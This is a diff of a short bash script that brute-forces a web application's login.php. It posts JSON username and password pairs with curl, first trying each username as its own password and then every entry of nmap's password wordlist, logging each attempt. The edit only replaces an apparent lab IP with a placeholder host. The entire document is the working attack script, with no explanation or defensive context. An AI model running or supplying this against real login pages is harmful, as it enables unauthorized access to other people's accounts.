@@ -7,11 +7,11 @@
 # Use usernames and these in this first loop also as passwords
 for i in `cat users`
 do 
-curl -o ${i}.nfo -i -X POST http://192.168.56.203/login.php  -d "{\"user\":\"${i}\",\"password\":\"${i}\"}" -H "Content-type: application/json" 
+curl -o ${i}.nfo -i -X POST http://aa.bb.cc.dd/login.php  -d "{\"user\":\"${i}\",\"password\":\"${i}\"}" -H "Content-type: application/json" 
 # Use usernames and in this second loop a wordlist for passwords
 for j in `cat /usr/share/wordlists/nmap.lst` 
 do 
-curl -o ${i}.${j}.nfo -i -X POST http://192.168.56.203/login.php -d "{\"user\":\"${i}\",\"password\":\"${j}\"}" -H "Content-type: application/json" ; echo user: $i pass: $j 
+curl -o ${i}.${j}.nfo -i -X POST http://aa.bb.cc.dd/login.php -d "{\"user\":\"${i}\",\"password\":\"${j}\"}" -H "Content-type: application/json" ; echo user: $i pass: $j 
 done
 done
 exit 0
